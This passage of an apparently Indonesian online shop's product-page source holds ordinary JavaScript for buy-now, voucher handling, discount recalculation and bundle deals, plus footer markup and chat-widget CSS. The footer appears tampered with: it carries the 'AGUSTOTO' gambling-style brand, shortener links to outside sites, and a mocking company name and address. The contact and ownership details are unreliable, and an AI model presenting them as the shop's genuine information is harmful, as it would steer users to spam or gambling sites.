        window.PlazaAnalytics.track('add_to_cart', { slug: String(window._pit_slug || '') });
      }

      const name = (window.PD_NAME !== undefined) ? String(window.PD_NAME) : (document.getElementById('pd-title')?.textContent || '');
      const sku  = (function(){ const el=document.getElementById('pd-sku'); return el?el.textContent.trim(): (window.PD_SKU||''); })();
      const variantText = getVariantSummaryText();

      if (window.showToast) {
        window.showToast({
          type: 'success',
          title: 'Berhasil ditambahkan ke Keranjang',
          message: `<strong>${esc(name)}</strong>${variantText?` Â· <em>${esc(variantText)}</em>`:''}<br>SKU: ${esc(sku)} Â· Qty: ${qty}`,
          duration: 5000,
          actions: [
            { label: 'Lihat Keranjang', onClick: ()=> { window.location.href = '/keranjang'; } },
            { label: 'Lanjut Belanja', variant: 'alt', onClick: ()=>{} }
          ]
        });
      }
    } catch (err) {
      if (window.showToast) {
        window.showToast({ type:'warn', title:'Gagal menambahkan', message: String(err?.message||'Terjadi kesalahan'), duration: 4500 });
      } else {
        console.error(err);
      }
    }
    return false;
  };
})();
</script>
<script data-inlined="pd-buynow.js">
(function(){
  
  // CSRF Token Helper
  function getCsrfToken() {
    return document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';
  }
  
  // Utility functions
  function esc(s){ return String(s||'').replace(/[&<>"']/g, m=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;' }[m])); }
  
  function getVariantSummaryText(){
    const vs = document.getElementById('pd-variant-summary');
    if (!vs) return '';
    const items = Array.from(vs.querySelectorAll('.vs-item strong')).map(el => el.textContent.trim()).filter(Boolean);
    return items.length ? items.join(' / ') : '';
  }

  function getCurrentProductData(){
    const form = document.getElementById('pd-buy-form');
    if (!form) return null;

    const productId = parseInt(form.dataset.pid || '0', 10);
    const qty = parseInt(form.querySelector('[name=qty]')?.value || '1', 10) || 1;
    const variantId = parseInt(document.getElementById('pd-variant-id')?.value || '0', 10) || 0;
    
    if (!productId || productId <= 0) {
      throw new Error('Product ID tidak valid');
    }

    if (qty <= 0) {
      throw new Error('Quantity harus lebih dari 0');
    }

    return { productId, qty, variantId };
  }

  function createBuyNowPayload(productId, qty, variantId) {
    // Get product metadata
    const name = (window.PD_NAME !== undefined) ? String(window.PD_NAME) : (document.getElementById('pd-title')?.textContent || '');
    
    // Get correct price, SKU, and weight from selected variant data instead of DOM elements
    let price = 0;
    let sku = '';
    let weight = 0;
    let dimensions = null;
    
    if (variantId > 0 && typeof window.variants !== 'undefined' && Array.isArray(window.variants)) {
      // Find the selected variant in the variants array
      const selectedVariant = window.variants.find(v => v.id === variantId);
      if (selectedVariant) {
        price = selectedVariant.final || 0;
        sku = selectedVariant.sku || '';
        weight = selectedVariant.weight || 0;
        
        // Include dimensions if available
        if (selectedVariant.length_cm || selectedVariant.width_cm || selectedVariant.height_cm) {
          dimensions = {
            length_cm: selectedVariant.length_cm || 0,
            width_cm: selectedVariant.width_cm || 0,
            height_cm: selectedVariant.height_cm || 0
          };
        }
        
        // Debug info to verify fix is working
        if (window.console && window.console.debug) {
          console.debug('BuyNow: Using variant data', {
            variantId: variantId,
            price: price,
            sku: sku,
            weight: weight,
            dimensions: dimensions,
            variantData: selectedVariant
          });
        }
      }
    }
    
    // Fallback to DOM elements if variant data not found
    if (price === 0) {
      const priceTxt = document.getElementById('pd-price-current')?.textContent || '';
      price = parseInt(String(priceTxt).replace(/[^\d]/g,''), 10) || 0;
      
      if (window.console && window.console.debug) {
        console.debug('BuyNow: Using DOM price fallback', { 
          priceTxt: priceTxt, 
          price: price,
          variantId: variantId,
          reason: variantId > 0 ? 'variant_data_not_found' : 'no_variant_selected'
        });
      }
    }
    
    if (!sku) {
      const skuEl = document.getElementById('pd-sku');
      sku = skuEl ? skuEl.textContent.trim() : (window.PD_SKU || '');
    }
    
    const imgEl = document.getElementById('pd-main-img');
    const image_url = imgEl ? (imgEl.getAttribute('src') || '') : '';

    const variantText = getVariantSummaryText();
    
    // Get pre-order data if product is pre-order
    const preorderData = window.PD_PREORDER_DATA || null;
    
    return {
      product_id: productId,
      qty: qty,
      variant_id: variantId,
      meta: {
        name,
        sku,
        price,
        image_url,
        variant_text: variantText,
        weight: weight,
        dimensions: dimensions
      },
      is_preorder: preorderData ? 'Y' : 'N',
      preorder_estimated_arrival: preorderData ? preorderData.estimated_arrival : null,
      preorder_note: preorderData ? preorderData.note : ''
    };
  }

  /**
   * Main Buy Now function
   * Performs validation and redirects to checkout with buy_now mode
   */
  window.buyNow = async function(e) {
    if (e) e.preventDefault();
    
    try {
      // Check user login status
      const isLoggedIn = document.querySelector('meta[name="user-logged-in"]')?.content === 'true' ||
                        document.body.classList.contains('logged-in') ||
                        window.userLoggedIn === true ||
                        document.body.dataset.userLoggedIn === 'true';
      
      if (!isLoggedIn) {
        // Redirect to login with return URL to current page
        const currentUrl = encodeURIComponent(window.location.pathname + window.location.search);
        window.location.href = '/login?return=' + currentUrl;
        return;
      }

      // Get current product data
      const { productId, qty, variantId } = getCurrentProductData();
      
      // Create payload for buy now
      const payload = createBuyNowPayload(productId, qty, variantId);
      
      // Store buy now data in sessionStorage for checkout page
      sessionStorage.setItem('buyNowData', JSON.stringify(payload));

      // Track add_to_cart (buy now counts as purchase intent)
      if (window.PlazaAnalytics) {
        window.PlazaAnalytics.track('add_to_cart', { slug: String(window._pit_slug || '') });
      }

      // Redirect to checkout with buy_now mode
      window.location.href = '/checkout?mode=buy_now';
      
    } catch (err) {
      console.error('Buy Now error:', err);
      
      if (window.showToast) {
        window.showToast({ 
          type: 'warn', 
          title: 'Gagal memproses', 
          message: String(err?.message || 'Terjadi kesalahan saat memproses pembelian'), 
          duration: 4500 
        });
      } else {
        alert(err.message || 'Terjadi kesalahan saat memproses pembelian');
      }
    }
  };

  /**
   * Alternative Buy Now with confirmation dialog
   */
  window.buyNowWithConfirm = async function(e) {
    if (e) e.preventDefault();
    
    try {
      const { productId, qty, variantId } = getCurrentProductData();
      
      const name = (window.PD_NAME !== undefined) ? String(window.PD_NAME) : (document.getElementById('pd-title')?.textContent || '');
      const variantText = getVariantSummaryText();
      const priceTxt = document.getElementById('pd-price-current')?.textContent || 'Rp0';
      
      const confirmMessage = `Lanjut ke checkout?\n\nProduk: ${name}${variantText ? `\nVariant: ${variantText}` : ''}\nQty: ${qty}\nHarga: ${priceTxt}`;
      
      if (!confirm(confirmMessage)) {
        return;
      }
      
      // Proceed with buy now
      await window.buyNow(e);
      
    } catch (err) {
      console.error('Buy Now with confirm error:', err);
      alert(err.message || 'Terjadi kesalahan');
    }
  };

  /**
   * Attach event listener for Buy with Voucher button
   */
  function setupBuyButtons() {
    // Setup desktop buy button (regular buy now without voucher)
    const buyBtn = document.getElementById('btn-buy');
    if (buyBtn) {
      buyBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (buyBtn.disabled) return;
        if (window.buyNow) {
          window.buyNow(e);
        }
      });
    }
    
    // Setup desktop buy with voucher button
    const voucherBtn = document.getElementById('btn-buy-voucher');
    if (voucherBtn) {
      voucherBtn.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Validate stock availability before proceeding
        if (this.disabled || this.getAttribute('data-stock-blocked') === 'true') {
          const stockReason = this.getAttribute('data-stock-reason') || 'Stok tidak tersedia';
          
          if (window.showToast) {
            window.showToast({
              type: 'warn',
              title: 'Stok Tidak Tersedia',
              message: stockReason,
              duration: 3500
            });
          } else {
            alert(stockReason);
          }
          return;
        }
        
        const voucherCode = this.dataset.voucherCode;
        if (voucherCode) {
          window.buyNowWithVoucher(e, voucherCode);
        }
      });
    }
    
  }
  
  // CRITICAL: Attach mobile button handler at DOCUMENT level with CAPTURE phase
  // This is the ONLY way to guarantee it fires regardless of other scripts
  document.addEventListener('click', function(e) {
    // Check if click is on mobile buy button or its children
    const target = e.target.closest('#mf-buy');
    if (!target) return; // Not our button
    
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    
    if (target.disabled) return;
    
    // Get voucher code from parent FAB's data attribute
    const mobileFab = document.getElementById('pd-mobile-fab');
    const voucherCode = mobileFab ? (mobileFab.getAttribute('data-voucher-code') || '') : '';
    
    if (voucherCode && voucherCode.trim() !== '' && window.buyNowWithVoucher) {
      window.buyNowWithVoucher(e, voucherCode);
    } else if (window.buyNow) {
      window.buyNow(e);
    }
  }, true); // CAPTURE PHASE - fires BEFORE any bubble phase handlers
  
  // Execute immediately if DOM already loaded, otherwise wait
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', setupBuyButtons);
  } else {
    setupBuyButtons();
  }

  /**
   * Buy Now with Auto-Applied Voucher
   * Applies voucher to session before redirecting to checkout (like cart does)
   * 
   * @param {Event} e - Click event
   * @param {string} voucherCode - Voucher code to apply
   */
  window.buyNowWithVoucher = async function(e, voucherCode) {
    if (e) e.preventDefault();
    
    console.log('[buyNowWithVoucher] Called with voucher code:', voucherCode);
    
    try {
      // CRITICAL: Check stock availability first
      const voucherBtn = document.getElementById('btn-buy-voucher');
      if (voucherBtn) {
        if (voucherBtn.disabled || voucherBtn.getAttribute('data-stock-blocked') === 'true') {
          const stockReason = voucherBtn.getAttribute('data-stock-reason') || 'Stok tidak tersedia';
          
          if (window.showToast) {
            window.showToast({
              type: 'warn',
              title: 'Stok Tidak Tersedia',
              message: stockReason,
              duration: 3500
            });
          } else {
            alert(stockReason);
          }
          return;
        }
      }
      
      // Check login status first
      const isLoggedIn = document.querySelector('meta[name="user-logged-in"]')?.content === 'true' ||
                        document.body.classList.contains('logged-in') ||
                        window.userLoggedIn === true ||
                        document.body.dataset.userLoggedIn === 'true';
      
      console.log('[buyNowWithVoucher] User logged in:', isLoggedIn);
      
      if (!isLoggedIn) {
        const currentUrl = encodeURIComponent(window.location.pathname + window.location.search);
        window.location.href = '/login?return=' + currentUrl;
        return;
      }

      // Get current product data
      const { productId, qty, variantId } = getCurrentProductData();
      const payload = createBuyNowPayload(productId, qty, variantId);
      
      console.log('[buyNowWithVoucher] Product data:', { productId, qty, variantId });
      
      // Get category path for voucher validation
      const categoryPath = window.PD_CATEGORY_PATH || '';
      
      // Step 1: Clear any existing voucher first (important for clean state)
      console.log('[buyNowWithVoucher] Step 1: Clearing existing voucher...');
      try {
        await fetch('/api/voucher/remove.php', {
          method: 'POST',
          headers: { 
            'X-CSRF-Token': getCsrfToken()
          },
          body: JSON.stringify({
            csrf_token: getCsrfToken()
          }),
          credentials: 'same-origin'
        });
      } catch (e) {
        // Ignore error if no voucher exists
        console.debug('No existing voucher to remove or removal failed');
      }
      
      // Step 2: Apply voucher to session (like cart does)
      console.log('[buyNowWithVoucher] Step 2: Applying voucher to session...');
      const applyRes = await fetch('/api/voucher/apply.php', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-CSRF-Token': getCsrfToken()
        },
        credentials: 'same-origin',
        body: JSON.stringify({
          csrf_token: getCsrfToken(),
          code: voucherCode,
          items: [{
            pid: productId,
            price: payload.meta.price,
            qty: qty,
            category_path: categoryPath
          }],
          shipping_cost: null // Will be calculated in checkout
        })
      });
      
      const applyData = await applyRes.json();
      
      console.log('[buyNowWithVoucher] Voucher apply response:', applyData);
      
      if (!applyData.success) {
        // Voucher invalid - show error and fallback to regular buy now
        console.warn('[buyNowWithVoucher] Voucher application failed:', applyData.message);
        if (window.showToast) {
          window.showToast({
            type: 'error',
            title: 'Voucher Tidak Valid',
            message: applyData.message || 'Voucher tidak dapat diterapkan untuk produk ini',
            duration: 4000
          });
        } else {
          alert(applyData.message || 'Voucher tidak dapat diterapkan');
        }
        
        // Fallback to regular buy now without voucher
        console.log('Voucher failed, proceeding with regular buy now');
        return window.buyNow(e);
      }
      
      // Step 3: Store buy now data in sessionStorage
      console.log('[buyNowWithVoucher] Step 3: Storing buy now data in sessionStorage');
      sessionStorage.setItem('buyNowData', JSON.stringify(payload));
      
      // Step 4: Redirect to checkout
      // Voucher sudah di session, checkout akan auto-load via loadAppliedVoucher()
      console.log('[buyNowWithVoucher] Step 4: Redirecting to checkout with voucher applied');
      window.location.href = '/checkout?mode=buy_now';
      
    } catch (err) {
      console.error('Buy Now with Voucher error:', err);
      
      if (window.showToast) {
        window.showToast({
          type: 'error',
          title: 'Terjadi Kesalahan',
          message: 'Gagal memproses pembelian dengan voucher. Silakan coba lagi.',
          duration: 3000
        });
      } else {
        alert('Gagal memproses pembelian. Silakan coba lagi.');
      }
    }
  };
})();
</script>
<script data-inlined="pd-voucher-recalc.js">
/**
 * Product Detail - Voucher Discount Recalculation
 * 
 * Handles dynamic voucher discount recalculation when variant price changes
 * Supports both PERCENTAGE and FIXED_AMOUNT voucher types
 */

(function() {
  'use strict';

  /**
   * Calculate voucher discount based on type and price
   * 
   * @param {string} type - Voucher type: 'PERCENTAGE' or 'FIXED_AMOUNT'
   * @param {number} value - Voucher value (percentage or fixed amount)
   * @param {number} price - Current variant price
   * @param {number} maxDiscount - Maximum discount for percentage vouchers (0 = no limit)
   * @return {number} Calculated discount amount
   */
  function calculateVoucherDiscount(type, value, price, maxDiscount) {
    if (type === 'PERCENTAGE') {
      // Calculate percentage discount
      let discount = (price * value) / 100;
      
      // Apply max discount cap if set
      if (maxDiscount > 0 && discount > maxDiscount) {
        discount = maxDiscount;
      }
      
      return Math.round(discount);
    } else {
      // FIXED_AMOUNT - discount doesn't change with price
      return Math.round(value);
    }
  }

  /**
   * Format number as Rupiah without 'Rp' prefix
   * 
   * @param {number} num - Number to format
   * @return {string} Formatted number (e.g., "20.000")
   */
  function formatNumber(num) {
    return Math.round(num).toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');
  }

  /**
   * Update voucher button discount label
   * 
   * @param {number} newPrice - New variant price
   */
  function updateVoucherDiscount(newPrice) {
    const voucherBtn = document.getElementById('btn-buy-voucher');
    if (!voucherBtn) return;

    // Get voucher data from button attributes
    const voucherType = voucherBtn.dataset.voucherType;
    const voucherValue = parseFloat(voucherBtn.dataset.voucherValue) || 0;
    const voucherMax = parseFloat(voucherBtn.dataset.voucherMax) || 0;

    if (!voucherType || voucherValue === 0) return;

    // Calculate new discount
    const newDiscount = calculateVoucherDiscount(voucherType, voucherValue, newPrice, voucherMax);

    // Update the discount label
    const saveLabel = voucherBtn.querySelector('.bv-save');
    if (saveLabel) {
      saveLabel.textContent = '-Rp' + formatNumber(newDiscount);
    }

    // Also update mobile FAB voucher display if exists
    updateMobileFabVoucher(newDiscount);
  }

  /**
   * Update mobile FAB voucher value
   * 
   * @param {number} discountAmount - New discount amount
   */
  function updateMobileFabVoucher(discountAmount) {
    const fab = document.getElementById('pd-mobile-fab');
    if (fab) {
      fab.dataset.voucherValue = discountAmount.toString();
    }
  }

  /**
   * Listen to variant change events and recalculate discount
   */
  function initVoucherRecalculation() {
    window.addEventListener('pd-variant-changed', function(e) {
      const detail = e.detail || {};
      const newPrice = detail.price || 0;

      if (newPrice > 0) {
        updateVoucherDiscount(newPrice);
      }
    });
  }

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initVoucherRecalculation);
  } else {
    initVoucherRecalculation();
  }

})();

</script>
<script nonce="se3iyzEHMc9FQEB4wSyd0w==">document.addEventListener('DOMContentLoaded',function(){if(typeof ProductReviews!=='undefined'){ProductReviews.init(325);}const r=document.getElementById('pd-rating-inline');if(r){r.addEventListener('click',function(e){e.preventDefault();const s=document.getElementById('reviews');if(s){s.scrollIntoView({behavior:'smooth',block:'start'});s.classList.add('highlight-flash');setTimeout(()=>{s.classList.remove('highlight-flash')},1500)}});}});</script>

<script nonce="se3iyzEHMc9FQEB4wSyd0w==">
(function(){function _0x9i0j(el){if(typeof gtag==='function'){gtag('event','qoala_insurance_click',{event_category:'Insurance',event_label:'Qoala Banner Click - Product Detail',link_url:'/plazait-protect',page_location:window.location.href,product_id:parseInt(el.getAttribute('data-product-id'))||0,product_name:el.getAttribute('data-product-name')||'',category_path:el.getAttribute('data-category-path')||'',custom_map:{custom_parameter_1:'qoala_banner_product_detail'}})}}

function _0x1k2l(){var a=document.querySelector('.qoala-cta[data-ga-event="qoala_banner_click"]');if(a){a.addEventListener('click',function(e){_0x9i0j(this)})}}if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',_0x1k2l)}else{_0x1k2l()}})();

(function(){const pwpSection=document.getElementById('pwp-deals-section');const pwpBadge=document.getElementById('pwp-trigger-badge');if(!pwpSection)return;const productId=parseInt(pwpSection.getAttribute('data-product-id'))||0;const variantId=parseInt(pwpSection.getAttribute('data-variant-id'))||0;const categoryPath=pwpSection.getAttribute('data-category-path')||'';if(!productId)return;function formatRupiah(n){return'Rp'+Math.floor(n).toLocaleString('id-ID')}function loadPWPDeals(){const url=`/api/pwp/get_by_product.php?product_id=${productId}${variantId?`&variant_id=${variantId}`:''}${categoryPath?`&category_path=${encodeURIComponent(categoryPath)}`:''}`;fetch(url).then(r=>r.json()).then(data=>{if(data.success&&data.promotions&&data.promotions.length>0){renderPWPDeals(data.promotions);pwpSection.hidden=false;if(pwpBadge)pwpBadge.hidden=false;setTimeout(function(){if(typeof window.adjustSidebarBanner==='function'){window.adjustSidebarBanner()}},150)}else{pwpSection.hidden=true;if(pwpBadge)pwpBadge.hidden=true}}).catch(err=>{console.error('PWP load error:',err);pwpSection.hidden=true;if(pwpBadge)pwpBadge.hidden=true})}function renderPWPDeals(promotions){const loading=pwpSection.querySelector('.pwp-deals-loading');const grid=document.getElementById('pwp-deals-grid');if(loading)loading.hidden=true;if(!grid)return;grid.innerHTML='';promotions.forEach(promo=>{promo.bundled_products.forEach(product=>{const card=document.createElement('div');card.className='pwp-deal-card';const discount=product.discount>0?product.discount:0;const discountPercent=product.regular_price>0?Math.round((discount/product.regular_price)*100):0;const imgUrl=product.image_url?`/uploads/products/${product.image_url}`:'/assets/img/no-image.png';card.innerHTML=`<div class="pwp-deal-thumb"><img src="${imgUrl}" alt="${escapeHtml(product.name)}" loading="lazy"></div><div class="pwp-deal-info"><h4 class="pwp-deal-name">${escapeHtml(product.name)}</h4><div class="pwp-deal-prices"><span class="pwp-deal-price">${formatRupiah(product.pwp_price)}</span>${product.regular_price>product.pwp_price?`<span class="pwp-deal-original">${formatRupiah(product.regular_price)}</span>`:''}</div></div>${discountPercent>0?`<span class="pwp-deal-badge">-${discountPercent}%</span>`:''}`;grid.appendChild(card)})})}function escapeHtml(str){const div=document.createElement('div');div.textContent=str||'';return div.innerHTML}loadPWPDeals();window.addEventListener('pd-variant-changed',function(e){const detail=e.detail||{};const newVid=detail.variant_id||0;const currentVid=parseInt(pwpSection.getAttribute('data-variant-id'))||0;if(newVid!==currentVid){pwpSection.setAttribute('data-variant-id',newVid);loadPWPDeals()}})})();
</script><footer class="site-footer footer-compact variant-stripes" role="contentinfo">
  <div class="ft-top ft-collapsible" id="ftTop">
    <div class="container ft-grid">

      <div class="ft-col ft-help">
        <h4 class="ft-title">Butuh Bantuan?</h4>
        <p class="ft-desc">Hubungi kami melalui Official WhatsApp interaktif sekarang.</p>
        <a class="ft-wa-btn" href="https://mikale.me/whatsappAGUSTOTO" target="_blank" rel="nofollow noopener">
          <span class="ico" aria-hidden="true">
            <svg viewBox="0 0 24 24" width="18" height="18"><path fill="#25D366" d="M12.04 2c-5.52 0-10 4.43-10 9.9 0 1.75.47 3.45 1.38 4.94L2 22l5.3-1.38c1.43.78 3.05 1.19 4.7 1.19 5.52 0 10-4.43 10-9.9S17.56 2 12.04 2Zm5.86 13.9c-.25.7-1.23 1.28-1.7 1.33-.45.06-1.02.08-1.65-.1-.38-.12-.88-.29-1.52-.56-2.66-1.15-4.4-3.83-4.53-4.01-.13-.18-1.08-1.44-1.08-2.75 0-1.31.68-1.95.92-2.22.25-.27.54-.33.72-.33.18 0 .36.01.52.01.17 0 .39-.06.62.47.25.6.85 2.07.92 2.22.07.15.12.33.02.53-.1.2-.15.33-.3.5-.15.17-.32.39-.46.53-.15.15-.3.31-.13.6.18.3.8 1.31 1.73 2.12 1.19 1.03 2.17 1.36 2.48 1.5.31.14.49.12.67-.07.18-.18.77-.82.98-1.1.21-.27.42-.23.7-.14.27.09 1.72.81 2.02.95.3.14.5.22.58.35.08.13.08.72-.17 1.42Z"/></svg>
          </span>
          Kirim Pesan
        </a>

        <p class="ft-desc sm-gap">Ikuti kami:</p>
        <div class="ft-social">
          <a aria-label="Facebook" href="https://facebook.com/PlazaIt/"><svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M13.5 22v-8.2h2.7l.4-3.2h-3.1V8c0-.9.3-1.5 1.6-1.5H17V3.7c-.3 0-1.2-.1-2.2-.1-2.2 0-3.8 1.3-3.8 3.9v2.2H8v3.2h3v8.1h2.5Z"/></svg></a>
          <a aria-label="Instagram" href="https://www.instagram.com/plazait"><svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M7.8 2h8.4A5.8 5.8 0 0 1 22 7.8v8.4A5.8 5.8 0 0 1 16.2 22H7.8A5.8 5.8 0 0 1 2 16.2V7.8A5.8 5.8 0 0 1 7.8 2Zm0 2A3.8 3.8 0 0 0 4 7.8v8.4A3.8 3.8 0 0 0 7.8 20h8.4a3.8 3.8 0 0 0 3.8-3.8V7.8A3.8 3.8 0 0 0 16.2 4H7.8Zm9.9 1.7a1.1 1.1 0 1 1 0 2.3 1.1 1.1 0 0 1 0-2.3ZM12 7a5 5 0 1 1 0 10 5 5 0 0 1 0-10Zm0 2a3 3 0 1 0 0 6 3 3 0 0 0 0-6Z"/></svg></a>
          <a aria-label="TikTok" href="https://www.tiktok.com/@plazait"><svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M18.9 7.4a6.4 6.4 0 0 1-3.2-1.2v6.3a5.47 5.47 0 1 1-5.5-5.5c.2 0 .4 0 .6.02v2.37a2.92 2.92 0 0 0-.6-.07 2.8 2.8 0 1 0 2.8 2.8V2h2.3a4.6 4.6 0 0 0 4.5 4.1v2.3Z"/></svg></a>
        </div>
      </div>

            <!-- Collapsible Content Wrapper (Non-Homepage Only) -->
      <div class="ft-collapsible-content" id="ftCollapsible">
      
      <div class="ft-col">
        <h4 class="ft-title">Tentang AGUSTOTO</h4>
        <ul class="ft-links">
          <li><a href="https://shortt.ink/anakbinjai">Tentang AGUSTOTO</a></li>
          <li><a href="https://shortt.ink/anakbinjai">Kontak AGUSTOTO</a></li>
          <li><a href="https://shortt.ink/anakbinjai">Lokasi Toko</a></li>
          <li><a href="https://shortt.ink/anakbinjai">FAQ</a></li>
        </ul>
        <div class="ft-address">
          <p class="company">PT.COPY PASTE HAHA</p>
                      <p>JL. Bacot Kau Boy No. 969, Kel. Pademangan Barat,</p>
                      <p>Kec. Jakarta, Kota Jakarta, DKI JAKARTA, 11752</p>
                  </div>
      </div>

      <div class="ft-col">
        <h4 class="ft-title">Informasi</h4>
        <ul class="ft-links">
          <li><a href="/syarat-dan-ketentuan">Syarat &amp; Ketentuan</a></li>
          <li><a href="/kebijakan-privasi">Kebijakan Privasi</a></li>
          <li><a href="/kebijakan-cookie">Kebijakan Cookie</a></li>
          <li><a href="/pengiriman-dan-pengembalian">Pengiriman &amp; Pengembalian</a></li>
          <li><a href="/pembayaran-dan-cicilan">Pembayaran &amp; Cicilan</a></li>
          <li><a href="/garansi-dan-layanan">Garansi &amp; Layanan</a></li>
        </ul>

        </div>
      </div>

            </div>
      <!-- End Collapsible Content -->
      
      <!-- Expand Button (Mobile Only) -->
      <button class="ft-expand-btn" id="ftExpandBtn" aria-label="Lihat semua informasi footer">
        <span class="expand-text">Selengkapnya</span>
        <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
          <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/>
        </svg>
      </button>
      
    </div>
  </div>
  <div class="ft-bottom">
    <div class="container ft-bottom-inner">
      <div class="ft-copy">
        <span>ANGIN-RIBUT &copy; <span id="yearNow">2026</span></span>
        <span>PT ANGIN-RIBUT. All rights reserved.</span>
      </div>
    </div>
  </div>
  
          <style nonce="se3iyzEHMc9FQEB4wSyd0w==">
            /* Chat Widget Styles - Lightweight & Minimal */
            .chat-widget {
                position: fixed;
                bottom: 20px;
                right: 20px;
                z-index: 9999;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            
            /* Hide floating button on mobile - use bottom nav instead */
            @media (max-width: 640px) {
                .chat-toggle-btn {
                    display: none !important;
                }
                
                /* Ensure popup is still visible on mobile even when button is hidden */
                .chat-widget {
                    display: block !important;
                }
                
                .chat-popup {
                    display: none; /* Hidden by default, shown via JS */
                }
                
                .chat-popup[style*="display: block"],
                .chat-popup[style*="display:block"] {
                    display: block !important;
                }
            }
            
            .chat-toggle-btn {
                width: 60px;
                height: 60px;
                border-radius: 50%;
                background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
                border: none;
                color: white;
                cursor: pointer;
                box-shadow: 0 4px 12px rgba(242, 140, 26, 0.3);
                position: relative;
                transition: transform 0.2s, box-shadow 0.2s;
            }
            
            .chat-toggle-btn:hover {
                transform: scale(1.05);
                box-shadow: 0 6px 20px rgba(242, 140, 26, 0.4);
            }
            
            #chat-toggle-btn .chat-icon {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 28px !important;
                height: 28px !important;
            }
            
            .chat-unread-badge {
                position: absolute;
                top: -5px;
                right: -5px;
                background: #8adeff;
                color: white;
                border-radius: 12px;
                padding: 2px 6px;
                font-size: 11px;
                font-weight: 600;
                min-width: 20px;
                text-align: center;
            }
            
            .chat-popup {
                position: absolute;
                bottom: 80px;
                right: 0;
                width: 380px;
                max-width: calc(100vw - 40px);
                height: 500px;
                max-height: calc(100vh - 120px);
                background: white;
                border-radius: 12px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                display: flex;
                flex-direction: column;
                overflow: hidden;
            }
            
            .chat-popup-header {
                background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
                color: white;
                padding: 16px 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                flex-shrink: 0;
            }
            
            .chat-header-title {
                display: flex;
                flex-direction: column;
                gap: 2px;
                min-height: 0;
            }
            
            .chat-popup-header h3 {
                margin: 0;
                font-size: 18px;
                font-weight: 600;
                line-height: 1.2;
            }
            
            .chat-operating-hours {
                font-size: 11px;
                opacity: 0.9;
                font-weight: 400;
                display: flex;
                align-items: center;
                gap: 4px;
                line-height: 1.2;
            }
            
            .chat-operating-hours svg {
                width: 12px;
                height: 12px;
                opacity: 0.8;
                flex-shrink: 0;
            }
            
            .chat-header-actions {
                display: flex;
                align-items: center;
                gap: 8px;
            }
            
            /* Notification Toggle Button */
            .btn-notif-toggle {
                background: none;
                border: none;
                color: white;
                font-size: 18px;
                cursor: pointer;
                padding: 4px 8px;
                transition: all 0.2s;
                opacity: 0.8;
            }
            
            .btn-notif-toggle:hover {
                opacity: 1;
                transform: scale(1.1);
            }
            
            /* Icon states */
            .btn-notif-toggle[data-status="not-subscribed"] svg {
                opacity: 0.7;
            }
            
            .btn-notif-toggle[data-status="not-subscribed"]:hover svg {
                opacity: 1;
            }
            
            .btn-notif-toggle[data-status="subscribed"] svg {
                opacity: 1;
                animation: bellRing 2s ease-in-out;
            }
            
            .btn-notif-toggle[data-status="blocked"] svg {
                color: #ff6b6b;
            }
            
            .btn-notif-toggle[data-status="not-supported"] {
                display: none !important;
            }
            
            @keyframes bellRing {
                0%, 100% { transform: rotate(0deg); }
                10%, 30% { transform: rotate(-10deg); }
                20%, 40% { transform: rotate(10deg); }
            }
            
            /* Notification Info Bar */
            .chat-notif-info-bar {
                position: absolute;
                top: 64px;
                left: 0;
                right: 0;
                background: linear-gradient(to right, #e3f2fd, #f5f5f5);
                border-bottom: 1px solid #bbdefb;
                padding: 8px 12px;
                display: flex;
                align-items: center;
                gap: 8px;
                font-size: 12px;
                color: #616161;
                z-index: 10;
                animation: slideDown 0.3s ease;
            }
            
            .chat-notif-info-bar svg {
                flex-shrink: 0;
            }
            
            .chat-notif-info-bar .small {
                flex: 1;
                line-height: 1.4;
            }
            
            .chat-notif-info-bar .btn-dismiss {
                background: none;
                border: none;
                color: #9e9e9e;
                cursor: pointer;
                padding: 0 4px;
                font-size: 16px;
                transition: color 0.2s;
            }
            
            .chat-notif-info-bar .btn-dismiss:hover {
                color: #616161;
            }
            
            @keyframes slideDown {
                from {
                    max-height: 0;
                    opacity: 0;
                }
                to {
                    max-height: 50px;
                    opacity: 1;
                }
            }
            
            .chat-close-btn {
                background: none;
                border: none;
                color: white;
                font-size: 28px;
                line-height: 1;
                cursor: pointer;
                padding: 0;
                width: 30px;
                height: 30px;
            }
            
            .chat-popup-body {
                flex: 1 1 auto;
                display: flex;
                flex-direction: column;
                min-height: 0;
                overflow: hidden;
                height: calc(100% - 64px);
                position: relative;
                transition: padding-top 0.3s ease;
            }
            
            /* Add padding when info bar is visible */
            .chat-popup-body.has-info-bar {
                padding-top: 40px;
            }
            
            .chat-view {
                flex: 1 1 auto;
                display: none;
                flex-direction: column;
                min-height: 0;
                overflow: hidden;
            }
            
            #chat-list-view {
                display: flex;
            }
            
            #chat-messages-view {
                display: none;
            }
            
            #chat-messages-view.active {
                display: flex;
                flex-direction: column;
            }
            
            #chat-new-view {
                display: none;
            }
            
            #chat-new-view.active {
                display: flex;
            }
            
            .chat-conversations-list {
                flex: 1;
                overflow-y: auto;
                padding: 0;
                background: white;
            }
            
            /* Custom Scrollbar for Conversations List */
            .chat-conversations-list::-webkit-scrollbar {
                width: 6px;
            }
            
            .chat-conversations-list::-webkit-scrollbar-track {
                background: #f1f1f1;
            }
            
            .chat-conversations-list::-webkit-scrollbar-thumb {
                background: #8adeff;
                border-radius: 3px;
            }
            
